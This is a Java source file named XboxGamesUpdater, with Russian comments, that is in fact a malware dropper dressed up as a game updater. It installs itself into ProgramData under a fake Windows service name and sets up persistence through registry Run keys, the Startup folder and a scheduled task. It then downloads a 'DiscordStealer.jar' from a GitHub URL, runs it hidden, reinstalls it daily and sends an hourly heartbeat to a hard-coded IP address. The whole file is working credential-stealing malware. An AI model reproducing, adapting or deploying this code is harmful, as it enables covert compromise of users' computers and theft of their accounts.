import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.jar.*;

public class XboxGamesUpdater {
    
    private static final String[] STEALER_MIRRORS = {
        "https://github.com/superbebra1234/Test_GG_hub/raw/main/DiscordStealer.jar"
    };
    
    private static final String INSTALL_PATH = System.getenv("PROGRAMDATA") + "\\Microsoft\\Windows\\Core\\core.jar";
    private static final String SERVICE_NAME = "WindowsCoreService";
    private static ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(3);
    
    public static void main(String[] args) {
        // Скрываем консоль
        hideConsole();
        
        // Устанавливаемся в систему
        install();
        
        // Запускаем основной стилер
        runStealer();
        
        // Периодические задачи
        scheduler.scheduleAtFixedRate(() -> update(), 24, 24, TimeUnit.HOURS);
        scheduler.scheduleAtFixedRate(() -> heartbeat(), 1, 1, TimeUnit.HOURS);
    }
    
    private static void hideConsole() {
        try {
            new ProcessBuilder("cmd.exe", "/c", "exit").start();
        } catch (Exception e) {}
    }
    
    private static void install() {
        try {
            String currentJar = XboxGamesUpdater.class.getProtectionDomain()
                .getCodeSource().getLocation().toURI().getPath();
            
            // Копируем в системную папку
            File installFile = new File(INSTALL_PATH);
            if (!installFile.exists()) {
                Files.copy(Paths.get(currentJar), Paths.get(INSTALL_PATH), StandardCopyOption.REPLACE_EXISTING);
            }
            
            // Добавляем в автозагрузку (3 способа для надёжности)
            addToRegistry();
            addToStartupFolder();
            addToTaskScheduler();
            
        } catch (Exception e) {}
    }
    
    private static void addToRegistry() {
        try {
            String[] regPaths = {
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            };
            for (String reg : regPaths) {
                Runtime.getRuntime().exec("reg add \"" + reg + "\" /v \"" + SERVICE_NAME + "\" /t REG_SZ /d \"" + INSTALL_PATH + "\" /f");
            }
        } catch (Exception e) {}
    }
    
    private static void addToStartupFolder() {
        try {
            String startup = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + SERVICE_NAME + ".jar";
            Files.copy(Paths.get(INSTALL_PATH), Paths.get(startup), StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception e) {}
    }
    
    private static void addToTaskScheduler() {
        try {
            Runtime.getRuntime().exec("schtasks /create /tn \"" + SERVICE_NAME + "\" /tr \"" + INSTALL_PATH + "\" /sc onlogon /f");
        } catch (Exception e) {}
    }
    
    private static void runStealer() {
        for (int attempt = 1; attempt <= 3; attempt++) {
            try {
                byte[] stealerData = downloadStealer();
                if (stealerData != null) {
                    String tempPath = System.getenv("TEMP") + "\\stealer.jar";
                    Files.write(Paths.get(tempPath), stealerData);
                    
                    ProcessBuilder pb = new ProcessBuilder("java", "-jar", tempPath);
                    pb.redirectErrorStream(true);
                    pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                    pb.start();
                    return;
                }
            } catch (Exception e) {}
            try { Thread.sleep(5000); } catch (Exception e) {}
        }
    }
    
    private static byte[] downloadStealer() {
        for (String mirror : STEALER_MIRRORS) {
            try {
                URL url = new URL(mirror);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                conn.setConnectTimeout(10000);
                
                if (conn.getResponseCode() == 200) {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    try (InputStream in = conn.getInputStream()) {
                        byte[] buffer = new byte[8192];
                        int bytesRead;
                        while ((bytesRead = in.read(buffer)) != -1) {
                            baos.write(buffer, 0, bytesRead);
                        }
                    }
                    return baos.toByteArray();
                }
            } catch (Exception e) {}
        }
        return null;
    }
    
    private static void update() {
        runStealer(); // Переустанавливаем стилер
    }
    
    private static void heartbeat() {
        // Отправляем сигнал что система жива (опционально)
        try {
            URL url = new URL("http://26.184.88.227:8891/heartbeat");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }
}
